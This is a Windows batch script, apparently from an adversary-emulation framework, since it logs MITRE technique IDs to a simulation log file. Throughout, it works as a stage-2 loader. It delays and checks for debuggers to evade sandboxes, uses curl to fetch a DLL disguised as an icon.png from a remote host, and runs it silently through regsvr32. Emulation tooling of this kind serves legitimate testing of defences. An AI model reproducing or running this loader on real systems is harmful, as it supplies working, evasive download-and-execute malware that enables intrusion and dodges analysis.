@echo off
setlocal enabledelayedexpansion

REM Random-named SET variable declarations for all PHR_* placeholders
SET aqjx7=%APPDATA%\10756\c62c99c3
SET b3zpl=08a6b120.txt
SET c8mny=https://10.0.0.49/stage/2/icon.png?10756-7
SET d2qwr=BALAM-S2BO
SET e9vx6=10756
SET f5hgt=7
SET g1kln=%PUBLIC%\\macula-simulations.log

REM Cache timestamp and log file reference
SET tsvar=%DATE%/%TIME%

REM ------------------ ANTI-EVASION: Initial Delay ------------------
timeout /t 15 /nobreak >nul
SET /A randdelay=%RANDOM% %% 4 + 2
timeout /t !randdelay! /nobreak >nul

REM ------------------ HEARTBEAT (Stage 2 DLL Download) ------------------
echo [!tsvar!][DEBUG][!d2qwr!][!e9vx6!]: heartbeat_start>> "!g1kln!" 2>nul
curl -k -s -o "!aqjx7!\!b3zpl!" "!c8mny!"
echo [!tsvar!][DEBUG][!d2qwr!][!e9vx6!]: heartbeat_complete>> "!g1kln!" 2>nul

REM ------------------ ANTI-EVASION: Delay between operations ------------------
ping -n 5 127.0.0.1 >nul

REM ------------------ Change working directory to output directory ------------------
echo [!tsvar!][DEBUG][!d2qwr!][!e9vx6!]: chdir_start>> "!g1kln!" 2>nul
cd /d "!aqjx7!" >nul 2>&1
if errorlevel 1 (
    echo [!tsvar!][DEBUG][!d2qwr!][!e9vx6!]: chdir_result=1>> "!g1kln!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!d2qwr!][!e9vx6!]: chdir_result=0>> "!g1kln!" 2>nul
)

REM ------------------ ANTI-EVASION: Choice delay ------------------
CHOICE /C Y /N /D Y /T 5 >nul

REM ------------------ ANTI-EVASION: Debugger check (simplified) ------------------
tasklist /NH /FI "STATUS eq RUNNING" 2>nul | findstr /I "debugger windbg x64dbg ollydbg" >nul 2>&1
if not errorlevel 1 (
    SET /A dbgsleep=%RANDOM% %% 4 + 2
    timeout /t !dbgsleep! /nobreak >nul
)
echo [!tsvar!][DEBUG][!d2qwr!][!e9vx6!]: anti_evasion_check_done>> "!g1kln!" 2>nul

REM ------------------ TTP Log: T1497 Virtualization/Sandbox Evasion ------------------
echo [!tsvar!][TTP][!d2qwr!][!e9vx6!]: T1497|Virtualization/Sandbox Evasion=OK:>> "!g1kln!" 2>nul

REM ------------------ Random Delay (sandbox evasion) ------------------
SET /A delay=%RANDOM% %% 20 + 10
timeout /t !delay! /nobreak >nul

REM ------------------ LOLBIN Execution (regsvr32) ------------------
echo [!tsvar!][DEBUG][!d2qwr!][!e9vx6!]: regsvr32_start>> "!g1kln!" 2>nul
regsvr32.exe /s "!b3zpl!"
set regsvr32_rc=!errorlevel!
echo [!tsvar!][DEBUG][!d2qwr!][!e9vx6!]: regsvr32_end=!regsvr32_rc!>> "!g1kln!" 2>nul

REM ------------------ TTP Log: T1218 System Binary Proxy Execution ------------------
if !regsvr32_rc! equ 0 (
    echo [!tsvar!][TTP][!d2qwr!][!e9vx6!]: T1218|System Binary Proxy Execution=OK:>> "!g1kln!" 2>nul
) else (
    echo [!tsvar!][TTP][!d2qwr!][!e9vx6!]: T1218|System Binary Proxy Execution=FAIL:exitcode=!regsvr32_rc!>> "!g1kln!" 2>nul
)

endlocal
exit /b 0